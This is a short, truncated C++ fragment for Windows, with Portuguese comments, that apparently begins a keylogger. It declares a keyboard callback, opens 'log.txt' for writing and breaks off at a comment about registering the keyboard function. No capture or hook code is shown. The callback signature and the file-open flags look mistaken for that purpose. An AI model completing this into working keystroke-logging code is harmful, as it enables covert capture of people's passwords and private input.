#include <iostream>
#include <fstream>
#include <Windows.h>

HANDLE hFile;

LRESULT CALLBACK KeyboardProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

int main()
{
    // Abra o arquivo para gravar
    hFile = CreateFile("log.txt", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // Registre a função de teclado
